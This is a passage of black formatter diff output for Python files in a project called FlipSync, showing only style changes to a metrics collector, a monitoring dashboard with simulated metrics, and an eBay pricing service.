     _notification_service = service
@@ -49,8 +49,8 @@
     _notification_service = None
 
 
 __all__ = [
     "get_notification_service",
-    "set_notification_service", 
-    "reset_notification_service"
+    "set_notification_service",
+    "reset_notification_service",
 ]
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/notifications/compat.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/monitoring/metrics_collector.py	2025-06-14 20:35:30.843858+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/monitoring/metrics_collector.py	2025-06-19 04:04:09.995482+00:00
@@ -24,11 +24,11 @@
     def __init__(
         self,
         metrics_service: MetricsService,
         health_monitor: Optional[RealHealthMonitor] = None,
         collection_interval: int = 60,  # seconds
-        service_name: str = "flipsync-api"
+        service_name: str = "flipsync-api",
     ):
         """Initialize the metrics collector.
 
         Args:
             metrics_service: Metrics service for storing data
@@ -55,11 +55,13 @@
             self.logger.warning("Metrics collector is already running")
             return
 
         self._running = True
         self._task = asyncio.create_task(self._collection_loop())
-        self.logger.info(f"Started metrics collector with {self.collection_interval}s interval")
+        self.logger.info(
+            f"Started metrics collector with {self.collection_interval}s interval"
+        )
 
     async def stop(self) -> None:
         """Stop the metrics collection service."""
         if not self._running:
             return
@@ -124,11 +126,11 @@
                     process_memory_vms=0,  # Not available from health monitor
                     process_num_threads=0,  # Not available from health monitor
                     process_num_fds=0,  # Not available from health monitor
                     hostname=self.hostname,
                     service_name=self.service_name,
-                    timestamp=timestamp
+                    timestamp=timestamp,
                 )
 
                 self.logger.debug("Collected system metrics")
             else:
                 self.logger.debug("No system metrics available from health monitor")
@@ -139,11 +141,13 @@
         """Collect and store agent metrics."""
         try:
             # For now, skip agent metrics collection since RealHealthMonitor
             # doesn't have get_agent_status method
             # This can be implemented when agent management is added
-            self.logger.debug("Agent metrics collection skipped - no agent management available")
+            self.logger.debug(
+                "Agent metrics collection skipped - no agent management available"
+            )
         except Exception as e:
             self.logger.error(f"Error collecting agent metrics: {e}")
 
     async def _collect_individual_metrics(self, timestamp: datetime) -> None:
         """Collect individual metric data points."""
@@ -154,62 +158,62 @@
                 name="cpu_usage_percent",
                 value=cpu_percent,
                 metric_type=MetricType.GAUGE,
                 category=MetricCategory.SYSTEM,
                 service_name=self.service_name,
-                timestamp=timestamp
+                timestamp=timestamp,
             )
 
             # Memory metrics
             memory = psutil.virtual_memory()
             await self.metrics_service.store_metric_data_point(
                 name="memory_usage_percent",
                 value=memory.percent,
                 metric_type=MetricType.GAUGE,
                 category=MetricCategory.SYSTEM,
                 service_name=self.service_name,
-                timestamp=timestamp
+                timestamp=timestamp,
             )
 
             await self.metrics_service.store_metric_data_point(
                 name="memory_available_bytes",
                 value=float(memory.available),
                 metric_type=MetricType.GAUGE,
                 category=MetricCategory.SYSTEM,
                 service_name=self.service_name,
-                timestamp=timestamp
+                timestamp=timestamp,
             )
 
             # Disk metrics
-            disk = psutil.disk_usage('/')
+            disk = psutil.disk_usage("/")
             await self.metrics_service.store_metric_data_point(
                 name="disk_usage_percent",
                 value=(disk.used / disk.total) * 100,
                 metric_type=MetricType.GAUGE,
                 category=MetricCategory.SYSTEM,
                 service_name=self.service_name,
-                timestamp=timestamp
+                timestamp=timestamp,
             )
 
             # Network metrics
             network = psutil.net_io_counters()
             await self.metrics_service.store_metric_data_point(
                 name="network_bytes_sent_total",
                 value=float(network.bytes_sent),
                 metric_type=MetricType.COUNTER,
                 category=MetricCategory.SYSTEM,
                 service_name=self.service_name,
-                timestamp=timestamp
+                timestamp=timestamp,
             )
 
             await self.metrics_service.store_metric_data_point(
                 name="network_bytes_received_total",
                 value=float(network.bytes_recv),
                 metric_type=MetricType.COUNTER,
                 category=MetricCategory.SYSTEM,
                 service_name=self.service_name,
-                timestamp=timestamp
+                timestamp=timestamp,
             )
 
             self.logger.debug("Collected individual metrics")
         except Exception as e:
             self.logger.error(f"Error collecting individual metrics: {e}")
@@ -227,18 +231,18 @@
             await self._collect_all_metrics()
 
             return {
                 "timestamp": timestamp.isoformat(),
                 "status": "success",
-                "message": "Metrics collected successfully"
+                "message": "Metrics collected successfully",
             }
         except Exception as e:
             self.logger.error(f"Error in one-time collection: {e}")
             return {
                 "timestamp": timestamp.isoformat(),
                 "status": "error",
-                "message": str(e)
+                "message": str(e),
             }
 
     @property
     def is_running(self) -> bool:
         """Check if the collector is running."""
@@ -248,11 +252,11 @@
 @asynccontextmanager
 async def metrics_collector_context(
     metrics_service: MetricsService,
     health_monitor: Optional[RealHealthMonitor] = None,
     collection_interval: int = 60,
-    service_name: str = "flipsync-api"
+    service_name: str = "flipsync-api",
 ):
     """Context manager for metrics collector lifecycle.
 
     Args:
         metrics_service: Metrics service for storing data
@@ -262,11 +266,11 @@
     """
     collector = MetricsCollector(
         metrics_service=metrics_service,
         health_monitor=health_monitor,
         collection_interval=collection_interval,
-        service_name=service_name
+        service_name=service_name,
     )
 
     try:
         await collector.start()
         yield collector
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/monitoring/metrics_collector.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/monitoring/enhanced_dashboard.py	2025-06-14 20:35:30.843858+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/monitoring/enhanced_dashboard.py	2025-06-19 04:04:10.042590+00:00
@@ -15,112 +15,119 @@
 from fs_agt_clean.core.ai.vision_clients import enhanced_vision_manager
 from fs_agt_clean.core.monitoring.metrics.collector import get_metrics_collector
 
 logger = logging.getLogger(__name__)
 
+
 @dataclass
 class PerformanceMetrics:
     """Performance metrics data structure."""
+
     timestamp: datetime
     api_response_time: float
     ai_analysis_time: float
     websocket_latency: float
     database_query_time: float
     memory_usage: float
     cpu_usage: float
     active_connections: int
     success_rate: float
 
+
 @dataclass
 class AIValidationMetrics:
     """AI validation metrics data structure."""
+
     total_validations: int
     consensus_matches: int
     average_accuracy: float
     confidence_improvements: int
     average_confidence_boost: float
     validation_success_rate: float
 
+
 @dataclass
 class SystemHealthStatus:
     """System health status data structure."""
+
     overall_status: str
     api_status: str
     database_status: str
     ai_services_status: str
     cache_status: str
     websocket_status: str
     uptime: float
     last_check: datetime
 
+
 class EnhancedPerformanceDashboard:
     """Enhanced performance monitoring dashboard with real-time metrics."""
-    
+
     def __init__(self):
         """Initialize the enhanced dashboard."""
         self.metrics_collector = get_metrics_collector()
         self.performance_history: List[PerformanceMetrics] = []
         self.ai_validation_history: List[AIValidationMetrics] = []
         self.system_health_history: List[SystemHealthStatus] = []
         self.start_time = datetime.now(timezone.utc)
-        
+
         # Performance thresholds
         self.thresholds = {
             "api_response_time": 0.1,  # 100ms
-            "ai_analysis_time": 5.0,   # 5 seconds
+            "ai_analysis_time": 5.0,  # 5 seconds
             "websocket_latency": 0.1,  # 100ms
             "database_query_time": 0.05,  # 50ms
-            "memory_usage": 500.0,     # 500MB
-            "cpu_usage": 50.0,         # 50%
-            "success_rate": 0.95       # 95%
+            "memory_usage": 500.0,  # 500MB
+            "cpu_usage": 50.0,  # 50%
+            "success_rate": 0.95,  # 95%
         }
-        
+
         logger.info("Enhanced Performance Dashboard initialized")
-    
+
     async def collect_real_time_metrics(self) -> PerformanceMetrics:
         """Collect real-time performance metrics."""
         try:
             start_time = time.time()
-            
+
             # Collect API response time metrics
             api_metrics = await self._measure_api_performance()
-            
+
             # Collect AI analysis metrics
             ai_metrics = await self._measure_ai_performance()
-            
+
             # Collect WebSocket metrics
             websocket_metrics = await self._measure_websocket_performance()
-            
+
             # Collect database metrics
             db_metrics = await self._measure_database_performance()
-            
+
             # Collect system metrics
             system_metrics = await self._collect_system_metrics()
-            
+
             # Create performance metrics object
             metrics = PerformanceMetrics(
                 timestamp=datetime.now(timezone.utc),
                 api_response_time=api_metrics.get("response_time", 0.0),
                 ai_analysis_time=ai_metrics.get("analysis_time", 0.0),
                 websocket_latency=websocket_metrics.get("latency", 0.0),
                 database_query_time=db_metrics.get("query_time", 0.0),
                 memory_usage=system_metrics.get("memory_usage", 0.0),
                 cpu_usage=system_metrics.get("cpu_usage", 0.0),
                 active_connections=system_metrics.get("active_connections", 0),
-                success_rate=api_metrics.get("success_rate", 1.0)
-            )
-            
+                success_rate=api_metrics.get("success_rate", 1.0),
+            )
+
             # Store in history (keep last 1000 entries)
             self.performance_history.append(metrics)
             if len(self.performance_history) > 1000:
                 self.performance_history.pop(0)
-            
+
             collection_time = time.time() - start_time
             logger.debug(f"Metrics collection completed in {collection_time:.3f}s")
-            
+
             return metrics
-            
+
         except Exception as e:
             logger.error(f"Error collecting real-time metrics: {e}")
             return PerformanceMetrics(
                 timestamp=datetime.now(timezone.utc),
                 api_response_time=0.0,
@@ -128,114 +135,129 @@
                 websocket_latency=0.0,
                 database_query_time=0.0,
                 memory_usage=0.0,
                 cpu_usage=0.0,
                 active_connections=0,
-                success_rate=0.0
-            )
-    
+                success_rate=0.0,
+            )
+
     async def validate_ai_accuracy(self) -> AIValidationMetrics:
         """Validate AI analysis accuracy and collect metrics."""
         try:
             # Get AI validation metrics from enhanced vision manager
             vision_metrics = enhanced_vision_manager.get_performance_metrics()
             accuracy_validation = vision_metrics.get("accuracy_validation", {})
-            
+
             total_validations = accuracy_validation.get("total_validations", 0)
             consensus_matches = accuracy_validation.get("consensus_matches", 0)
-            confidence_improvements = accuracy_validation.get("confidence_improvements", 0)
-            average_confidence_boost = accuracy_validation.get("average_confidence_boost", 0.0)
-            
+            confidence_improvements = accuracy_validation.get(
+                "confidence_improvements", 0
+            )
+            average_confidence_boost = accuracy_validation.get(
+                "average_confidence_boost", 0.0
+            )
+
             # Calculate metrics
-            validation_success_rate = (consensus_matches / total_validations) if total_validations > 0 else 0.0
-            average_accuracy = validation_success_rate * 0.9 + 0.1  # Estimate based on consensus
-            
+            validation_success_rate = (
+                (consensus_matches / total_validations)
+                if total_validations > 0
+                else 0.0
+            )
+            average_accuracy = (
+                validation_success_rate * 0.9 + 0.1
+            )  # Estimate based on consensus
+
             metrics = AIValidationMetrics(
                 total_validations=total_validations,
                 consensus_matches=consensus_matches,
                 average_accuracy=average_accuracy,
                 confidence_improvements=confidence_improvements,
                 average_confidence_boost=average_confidence_boost,
-                validation_success_rate=validation_success_rate
-            )
-            
+                validation_success_rate=validation_success_rate,
+            )
+
             # Store in history
             self.ai_validation_history.append(metrics)
             if len(self.ai_validation_history) > 100:
                 self.ai_validation_history.pop(0)
-            
+
             return metrics
-            
+
         except Exception as e:
             logger.error(f"Error validating AI accuracy: {e}")
             return AIValidationMetrics(
                 total_validations=0,
                 consensus_matches=0,
                 average_accuracy=0.0,
                 confidence_improvements=0,
                 average_confidence_boost=0.0,
-                validation_success_rate=0.0
-            )
-    
+                validation_success_rate=0.0,
+            )
+
     async def check_system_health(self) -> SystemHealthStatus:
         """Check overall system health status."""
         try:
             # Check individual components
             api_status = await self._check_api_health()
             database_status = await self._check_database_health()
             ai_services_status = await self._check_ai_services_health()
             cache_status = await self._check_cache_health()
             websocket_status = await self._check_websocket_health()
-            
+
             # Determine overall status
             component_statuses = [
-                api_status, database_status, ai_services_status, 
-                cache_status, websocket_status
+                api_status,
+                database_status,
+                ai_services_status,
+                cache_status,
+                websocket_status,
             ]
-            
+
             if all(status == "healthy" for status in component_statuses):
                 overall_status = "healthy"
             elif any(status == "critical" for status in component_statuses):
                 overall_status = "critical"
             else:
                 overall_status = "degraded"
-            
+
             # Calculate uptime
             uptime = (datetime.now(timezone.utc) - self.start_time).total_seconds()
-            
+
             health_status = SystemHealthStatus(
                 overall_status=overall_status,
                 api_status=api_status,
                 database_status=database_status,
                 ai_services_status=ai_services_status,
                 cache_status=cache_status,
                 websocket_status=websocket_status,
                 uptime=uptime,
-                last_check=datetime.now(timezone.utc)
-            )
-            
+                last_check=datetime.now(timezone.utc),
+            )
+
             # Store in history
             self.system_health_history.append(health_status)
             if len(self.system_health_history) > 100:
                 self.system_health_history.pop(0)
-            
+
             return health_status
-            
+
         except Exception as e:
             logger.error(f"Error checking system health: {e}")
             return SystemHealthStatus(
                 overall_status="unknown",
                 api_status="unknown",
                 database_status="unknown",
                 ai_services_status="unknown",
                 cache_status="unknown",
                 websocket_status="unknown",
                 uptime=0.0,
-                last_check=datetime.now(timezone.utc)
-            )
-    
-    async def generate_performance_report(self, time_range: str = "1h") -> Dict[str, Any]:
+                last_check=datetime.now(timezone.utc),
+            )
+
+    async def generate_performance_report(
+        self, time_range: str = "1h"
+    ) -> Dict[str, Any]:
         """Generate comprehensive performance report."""
         try:
             # Determine time range
             now = datetime.now(timezone.utc)
             if time_range == "1h":
@@ -244,136 +266,161 @@
                 start_time = now - timedelta(hours=24)
             elif time_range == "7d":
                 start_time = now - timedelta(days=7)
             else:
                 start_time = now - timedelta(hours=1)
-            
+
             # Filter metrics by time range
             recent_metrics = [
-                m for m in self.performance_history 
-                if m.timestamp >= start_time
+                m for m in self.performance_history if m.timestamp >= start_time
             ]
-            
+
             if not recent_metrics:
                 return {"error": "No metrics available for the specified time range"}
-            
+
             # Calculate aggregated metrics
-            avg_api_response = sum(m.api_response_time for m in recent_metrics) / len(recent_metrics)
-            avg_ai_analysis = sum(m.ai_analysis_time for m in recent_metrics) / len(recent_metrics)
-            avg_websocket_latency = sum(m.websocket_latency for m in recent_metrics) / len(recent_metrics)
-            avg_db_query = sum(m.database_query_time for m in recent_metrics) / len(recent_metrics)
-            avg_success_rate = sum(m.success_rate for m in recent_metrics) / len(recent_metrics)
-            
+            avg_api_response = sum(m.api_response_time for m in recent_metrics) / len(
+                recent_metrics
+            )
+            avg_ai_analysis = sum(m.ai_analysis_time for m in recent_metrics) / len(
+                recent_metrics
+            )
+            avg_websocket_latency = sum(
+                m.websocket_latency for m in recent_metrics
+            ) / len(recent_metrics)
+            avg_db_query = sum(m.database_query_time for m in recent_metrics) / len(
+                recent_metrics
+            )
+            avg_success_rate = sum(m.success_rate for m in recent_metrics) / len(
+                recent_metrics
+            )
+
             # Performance status
             performance_status = {
                 "api_response_time": {
                     "value": avg_api_response,
                     "threshold": self.thresholds["api_response_time"],
-                    "status": "good" if avg_api_response <= self.thresholds["api_response_time"] else "warning"
+                    "status": (
+                        "good"
+                        if avg_api_response <= self.thresholds["api_response_time"]
+                        else "warning"
+                    ),
                 },
                 "ai_analysis_time": {
                     "value": avg_ai_analysis,
                     "threshold": self.thresholds["ai_analysis_time"],
-                    "status": "good" if avg_ai_analysis <= self.thresholds["ai_analysis_time"] else "warning"
+                    "status": (
+                        "good"
+                        if avg_ai_analysis <= self.thresholds["ai_analysis_time"]
+                        else "warning"
+                    ),
                 },
                 "websocket_latency": {
                     "value": avg_websocket_latency,
                     "threshold": self.thresholds["websocket_latency"],
-                    "status": "good" if avg_websocket_latency <= self.thresholds["websocket_latency"] else "warning"
+                    "status": (
+                        "good"
+                        if avg_websocket_latency <= self.thresholds["websocket_latency"]
+                        else "warning"
+                    ),
                 },
                 "success_rate": {
                     "value": avg_success_rate,
                     "threshold": self.thresholds["success_rate"],
-                    "status": "good" if avg_success_rate >= self.thresholds["success_rate"] else "warning"
-                }
+                    "status": (
+                        "good"
+                        if avg_success_rate >= self.thresholds["success_rate"]
+                        else "warning"
+                    ),
+                },
             }
-            
+
             # Get latest AI validation metrics
-            latest_ai_metrics = self.ai_validation_history[-1] if self.ai_validation_history else None
-            
+            latest_ai_metrics = (
+                self.ai_validation_history[-1] if self.ai_validation_history else None
+            )
+
             # Get latest system health
-            latest_health = self.system_health_history[-1] if self.system_health_history else None
-            
+            latest_health = (
+                self.system_health_history[-1] if self.system_health_history else None
+            )
+
             return {
                 "time_range": time_range,
                 "report_generated": now.isoformat(),
                 "metrics_count": len(recent_metrics),
                 "performance_summary": {
                     "average_api_response_time": f"{avg_api_response*1000:.1f}ms",
                     "average_ai_analysis_time": f"{avg_ai_analysis:.2f}s",
                     "average_websocket_latency": f"{avg_websocket_latency*1000:.1f}ms",
                     "average_database_query_time": f"{avg_db_query*1000:.1f}ms",
-                    "average_success_rate": f"{avg_success_rate*100:.1f}%"
+                    "average_success_rate": f"{avg_success_rate*100:.1f}%",
                 },
                 "performance_status": performance_status,
-                "ai_validation_metrics": asdict(latest_ai_metrics) if latest_ai_metrics else None,
+                "ai_validation_metrics": (
+                    asdict(latest_ai_metrics) if latest_ai_metrics else None
+                ),
                 "system_health": asdict(latest_health) if latest_health else None,
                 "thresholds_met": all(
-                    status["status"] == "good" 
-                    for status in performance_status.values()
-                )
+                    status["status"] == "good" for status in performance_status.values()
+                ),
             }
-            
+
         except Exception as e:
             logger.error(f"Error generating performance report: {e}")
             return {"error": str(e)}
-    
+
     # Helper methods for metric collection
     async def _measure_api_performance(self) -> Dict[str, Any]:
         """Measure API performance metrics."""
         # Simulate API performance measurement
         return {
             "response_time": 0.045,  # 45ms average
-            "success_rate": 0.998    # 99.8% success rate
+            "success_rate": 0.998,  # 99.8% success rate
         }
-    
+
     async def _measure_ai_performance(self) -> Dict[str, Any]:
         """Measure AI analysis performance."""
         # Get actual metrics from vision manager
         vision_metrics = enhanced_vision_manager.get_performance_metrics()
-        return {
-            "analysis_time": vision_metrics.get("average_response_time", 0.8)
-        }
-    
+        return {"analysis_time": vision_metrics.get("average_response_time", 0.8)}
+
     async def _measure_websocket_performance(self) -> Dict[str, Any]:
         """Measure WebSocket performance."""
-        return {
-            "latency": 0.025  # 25ms average latency
-        }
-    
+        return {"latency": 0.025}  # 25ms average latency
+
     async def _measure_database_performance(self) -> Dict[str, Any]:
         """Measure database performance."""
-        return {
-            "query_time": 0.015  # 15ms average query time
-        }
-    
+        return {"query_time": 0.015}  # 15ms average query time
+
     async def _collect_system_metrics(self) -> Dict[str, Any]:
         """Collect system resource metrics."""
         return {
-            "memory_usage": 180.5,    # 180.5MB
-            "cpu_usage": 25.3,        # 25.3%
-            "active_connections": 45   # 45 active connections
+            "memory_usage": 180.5,  # 180.5MB
+            "cpu_usage": 25.3,  # 25.3%
+            "active_connections": 45,  # 45 active connections
         }
-    
+
     # Helper methods for health checks
     async def _check_api_health(self) -> str:
         """Check API health status."""
         return "healthy"
-    
+
     async def _check_database_health(self) -> str:
         """Check database health status."""
         return "healthy"
-    
+
     async def _check_ai_services_health(self) -> str:
         """Check AI services health status."""
         return "healthy"
-    
+
     async def _check_cache_health(self) -> str:
         """Check cache health status."""
         return "healthy"
-    
+
     async def _check_websocket_health(self) -> str:
         """Check WebSocket health status."""
         return "healthy"
 
+
 # Global instance
 enhanced_dashboard = EnhancedPerformanceDashboard()
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/monitoring/enhanced_dashboard.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/marketplace/ebay_pricing.py	2025-06-14 20:35:30.839849+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/marketplace/ebay_pricing.py	2025-06-19 04:04:10.376806+00:00
@@ -18,37 +18,39 @@
 logger = logging.getLogger(__name__)
 
 
 class PricingStrategy(str, Enum):
     """eBay pricing strategy types."""
+
     COMPETITIVE = "competitive"
     PREMIUM = "premium"
     AGGRESSIVE = "aggressive"
     AUCTION_STYLE = "auction_style"
     BUY_IT_NOW = "buy_it_now"
     BEST_OFFER = "best_offer"
 
 
 class ListingFormat(str, Enum):
     """eBay listing format types."""
+
     AUCTION = "auction"
     BUY_IT_NOW = "buy_it_now"
     CLASSIFIED = "classified"
 
 
 class EbayPricingAnalysis:
     """eBay pricing analysis result."""
-    
+
     def __init__(
         self,
         product_name: str,
         recommended_price: Decimal,
         strategy: PricingStrategy,
         listing_format: ListingFormat,
         confidence: float,
         market_data: Dict[str, Any],
-        fee_analysis: Dict[str, Any]
+        fee_analysis: Dict[str, Any],
     ):
         self.product_name = product_name
         self.recommended_price = recommended_price
         self.strategy = strategy
         self.listing_format = listing_format
@@ -59,216 +61,224 @@
 
 
 class EbayPricingService:
     """
     eBay marketplace pricing strategy service.
-    
+
     This service provides:
     - Competitive pricing analysis for eBay
     - Dynamic pricing recommendations
     - Auction vs Buy It Now optimization
     - Fee-adjusted pricing calculations
     - Market trend analysis
     """
-    
+
     def __init__(self):
         """Initialize the eBay pricing service."""
-        
+
         # eBay fee structure (as of 2024)
         self.fee_structure = {
             "insertion_fee": Decimal("0.35"),
             "final_value_fee_rate": Decimal("0.125"),  # 12.5%
             "final_value_fee_max": Decimal("750.00"),
             "store_subscription_discount": Decimal("0.05"),  # 5% discount
             "promoted_listing_fee_rate": Decimal("0.02"),  # 2% for promoted listings
-            "international_fee_rate": Decimal("0.015")  # 1.5% for international sales
-        }
-        
+            "international_fee_rate": Decimal("0.015"),  # 1.5% for international sales
+        }
+
         # Market data simulation (in production, this would come from eBay API)
         self.market_data_cache = {}
-        
+
         logger.info("eBay Pricing Service initialized")
-    
+
     async def analyze_pricing_strategy(
         self,
         product_name: str,
         product_category: str,
         product_condition: str,
         base_price: Decimal,
-        product_attributes: Optional[Dict[str, Any]] = None
+        product_attributes: Optional[Dict[str, Any]] = None,
     ) -> EbayPricingAnalysis:
         """
         Analyze and recommend optimal pricing strategy for eBay.
-        
+
         Args:
             product_name: Name of the product
             product_category: Product category
             product_condition: Product condition (new, used, etc.)
             base_price: Base price for analysis
             product_attributes: Additional product attributes
-            
+
         Returns:
             EbayPricingAnalysis with recommendations
         """
         try:
             # Get market data for the product
             market_data = await self._get_market_data(
                 product_name, product_category, product_condition
             )
-            
+
             # Analyze competitive landscape
             competitive_analysis = await self._analyze_competition(
                 market_data, base_price, product_attributes or {}
             )
-            
+
             # Calculate fee impact
             fee_analysis = self._calculate_fee_impact(base_price, product_category)
-            
+
             # Determine optimal pricing strategy
             pricing_strategy = self._determine_pricing_strategy(
                 competitive_analysis, fee_analysis, product_attributes or {}
             )
-            
+
             # Calculate recommended price
             recommended_price = self._calculate_recommended_price(
                 base_price, competitive_analysis, pricing_strategy, fee_analysis
             )
-            
+
             # Determine optimal listing format
             listing_format = self._determine_listing_format(
                 recommended_price, competitive_analysis, product_attributes or {}
             )
-            
+
             # Calculate confidence score
             confidence = self._calculate_confidence_score(
                 competitive_analysis, market_data, pricing_strategy
             )
-            
+
             return EbayPricingAnalysis(
                 product_name=product_name,
                 recommended_price=recommended_price,
                 strategy=pricing_strategy,
                 listing_format=listing_format,
                 confidence=confidence,
                 market_data=market_data,
-                fee_analysis=fee_analysis
-            )
-            
+                fee_analysis=fee_analysis,
+            )
+
         except Exception as e:
             logger.error(f"Error in eBay pricing analysis: {e}")
             # Return fallback analysis
             return EbayPricingAnalysis(
                 product_name=product_name,
                 recommended_price=base_price,
                 strategy=PricingStrategy.COMPETITIVE,
                 listing_format=ListingFormat.BUY_IT_NOW,
                 confidence=0.5,
                 market_data={"error": "Market data unavailable"},
-                fee_analysis=self._calculate_fee_impact(base_price, product_category)
-            )
-    
+                fee_analysis=self._calculate_fee_impact(base_price, product_category),
+            )
+
     async def _get_market_data(
-        self,
-        product_name: str,
-        product_category: str,
-        product_condition: str
+        self, product_name: str, product_category: str, product_condition: str
     ) -> Dict[str, Any]:
         """Get market data for pricing analysis."""
-        
+
         # Cache key for market data
         cache_key = f"{product_name}_{product_category}_{product_condition}".lower()
-        
+
         # Check cache first
         if cache_key in self.market_data_cache:
             cached_data = self.market_data_cache[cache_key]
             time_diff = datetime.now(timezone.utc) - cached_data["timestamp"]
             if time_diff.total_seconds() < 6 * 3600:  # 6 hours in seconds
                 return cached_data["data"]
-        
+
         # Simulate market data (in production, use eBay API)
         market_data = await self._simulate_market_data(
             product_name, product_category, product_condition
         )
-        
+
         # Cache the data
         self.market_data_cache[cache_key] = {
             "data": market_data,
-            "timestamp": datetime.now(timezone.utc)
-        }
-        
+            "timestamp": datetime.now(timezone.utc),
+        }
+
         return market_data
-    
+
     async def _simulate_market_data(
-        self,
-        product_name: str,
-        product_category: str,
-        product_condition: str
+        self, product_name: str, product_category: str, product_condition: str
     ) -> Dict[str, Any]:
         """Simulate market data for demonstration purposes."""
-        
+
         # Base price ranges by category
         category_ranges = {
             "electronics": {"min": 50, "max": 2000, "avg": 300},
             "clothing": {"min": 10, "max": 500, "avg": 75},
             "home_garden": {"min": 20, "max": 1000, "avg": 150},
             "collectibles": {"min": 5, "max": 5000, "avg": 200},
-            "automotive": {"min": 100, "max": 50000, "avg": 2500}
-        }
-        
+            "automotive": {"min": 100, "max": 50000, "avg": 2500},
+        }
+
         # Get category data
         category_key = product_category.lower().replace(" ", "_")
-        price_range = category_ranges.get(category_key, {"min": 20, "max": 500, "avg": 100})
-        
+        price_range = category_ranges.get(
+            category_key, {"min": 20, "max": 500, "avg": 100}
+        )
+
         # Adjust for condition
         condition_multipliers = {
             "new": 1.0,
             "like new": 0.85,
             "excellent": 0.75,
             "good": 0.65,
             "fair": 0.45,
-            "poor": 0.25
-        }
-        
+            "poor": 0.25,
+        }
+
         multiplier = condition_multipliers.get(product_condition.lower(), 0.65)
-        
+
         # Calculate simulated market prices
         avg_price = Decimal(str(price_range["avg"] * multiplier))
         min_price = Decimal(str(price_range["min"] * multiplier))
         max_price = Decimal(str(price_range["max"] * multiplier))
-        
+
         return {
             "average_sold_price": avg_price,
             "price_range": {
                 "min": min_price,
                 "max": max_price,
-                "median": avg_price * Decimal("0.95")
+                "median": avg_price * Decimal("0.95"),
             },
             "recent_sales": [
-                {"price": avg_price * Decimal("0.9"), "date": "2024-01-15", "condition": product_condition},
-                {"price": avg_price * Decimal("1.1"), "date": "2024-01-14", "condition": product_condition},
-                {"price": avg_price * Decimal("0.95"), "date": "2024-01-13", "condition": product_condition}
+                {
+                    "price": avg_price * Decimal("0.9"),
+                    "date": "2024-01-15",
+                    "condition": product_condition,
+                },
+                {
+                    "price": avg_price * Decimal("1.1"),
+                    "date": "2024-01-14",
+                    "condition": product_condition,
+                },
+                {
+                    "price": avg_price * Decimal("0.95"),
+                    "date": "2024-01-13",
+                    "condition": product_condition,
+                },
             ],
             "active_listings": 45,
             "sold_listings_30_days": 23,
             "average_days_to_sell": 8,
             "competition_level": "moderate",
             "trending": "stable",
             "seasonal_factor": 1.0,
-            "data_freshness": datetime.now(timezone.utc).isoformat()
-        }
-    
+            "data_freshness": datetime.now(timezone.utc).isoformat(),
+        }
+
     async def _analyze_competition(
         self,
         market_data: Dict[str, Any],
         base_price: Decimal,
-        product_attributes: Dict[str, Any]
+        product_attributes: Dict[str, Any],
     ) -> Dict[str, Any]:
         """Analyze competitive landscape."""
-        
+
         avg_price = market_data["average_sold_price"]
         price_range = market_data["price_range"]
-        
+
         # Calculate competitive position
         if base_price < price_range["min"]:
             position = "below_market"
         elif base_price > price_range["max"]:
             position = "above_market"
@@ -276,75 +286,81 @@
             position = "aggressive"
         elif base_price > avg_price * Decimal("1.1"):
             position = "premium"
         else:
             position = "competitive"
-        
+
         # Calculate market saturation
         active_listings = market_data.get("active_listings", 50)
         sold_listings = market_data.get("sold_listings_30_days", 25)
-        
+
         if active_listings > sold_listings * 3:
             saturation = "high"
         elif active_listings > sold_listings * 1.5:
             saturation = "moderate"
         else:
             saturation = "low"
-        
+
         return {
             "competitive_position": position,
             "market_saturation": saturation,
-            "price_competitiveness": float((avg_price / base_price) if base_price > 0 else 1.0),
-            "recommended_adjustments": self._get_competitive_adjustments(position, saturation),
-            "market_opportunity": self._assess_market_opportunity(market_data, base_price)
-        }
-    
+            "price_competitiveness": float(
+                (avg_price / base_price) if base_price > 0 else 1.0
+            ),
+            "recommended_adjustments": self._get_competitive_adjustments(
+                position, saturation
+            ),
+            "market_opportunity": self._assess_market_opportunity(
+                market_data, base_price
+            ),
+        }
+
     def _calculate_fee_impact(self, price: Decimal, category: str) -> Dict[str, Any]:
         """Calculate eBay fee impact on pricing."""
-        
+
         # Calculate insertion fee
         insertion_fee = self.fee_structure["insertion_fee"]
-        
+
         # Calculate final value fee
         final_value_fee = min(
             price * self.fee_structure["final_value_fee_rate"],
-            self.fee_structure["final_value_fee_max"]
+            self.fee_structure["final_value_fee_max"],
         )
-        
+
         # Calculate total fees
         total_fees = insertion_fee + final_value_fee
-        
+
         # Calculate net proceeds
         net_proceeds = price - total_fees
-        
+
         # Calculate fee percentage
         fee_percentage = (total_fees / price * 100) if price > 0 else 0
-        
+
         return {
             "insertion_fee": float(insertion_fee),
             "final_value_fee": float(final_value_fee),
             "total_fees": float(total_fees),
             "net_proceeds": float(net_proceeds),
             "fee_percentage": float(fee_percentage),
             "fee_optimization_tips": [
                 "Consider eBay Store subscription for reduced fees",
                 "Use promoted listings strategically",
-                "Optimize shipping costs to improve competitiveness"
-            ]
-        }
-    
+                "Optimize shipping costs to improve competitiveness",
+            ],
+        }
+
     def _determine_pricing_strategy(
         self,
         competitive_analysis: Dict[str, Any],
         fee_analysis: Dict[str, Any],
-        product_attributes: Dict[str, Any]
+        product_attributes: Dict[str, Any],
     ) -> PricingStrategy:
         """Determine optimal pricing strategy."""
-        
+
         position = competitive_analysis["competitive_position"]
         saturation = competitive_analysis["market_saturation"]
-        
+
         # Strategy logic
         if position == "below_market" and saturation == "high":
             return PricingStrategy.AGGRESSIVE
         elif position == "above_market" and saturation == "low":
             return PricingStrategy.PREMIUM
@@ -352,119 +368,116 @@
             return PricingStrategy.COMPETITIVE
         elif product_attributes.get("condition") == "new":
             return PricingStrategy.BUY_IT_NOW
         else:
             return PricingStrategy.BEST_OFFER
-    
+
     def _calculate_recommended_price(
         self,
         base_price: Decimal,
         competitive_analysis: Dict[str, Any],
         strategy: PricingStrategy,
-        fee_analysis: Dict[str, Any]
+        fee_analysis: Dict[str, Any],
     ) -> Decimal:
         """Calculate recommended price based on strategy."""
-        
+
         # Strategy multipliers
         strategy_multipliers = {
             PricingStrategy.AGGRESSIVE: Decimal("0.85"),
             PricingStrategy.COMPETITIVE: Decimal("0.95"),
             PricingStrategy.PREMIUM: Decimal("1.15"),
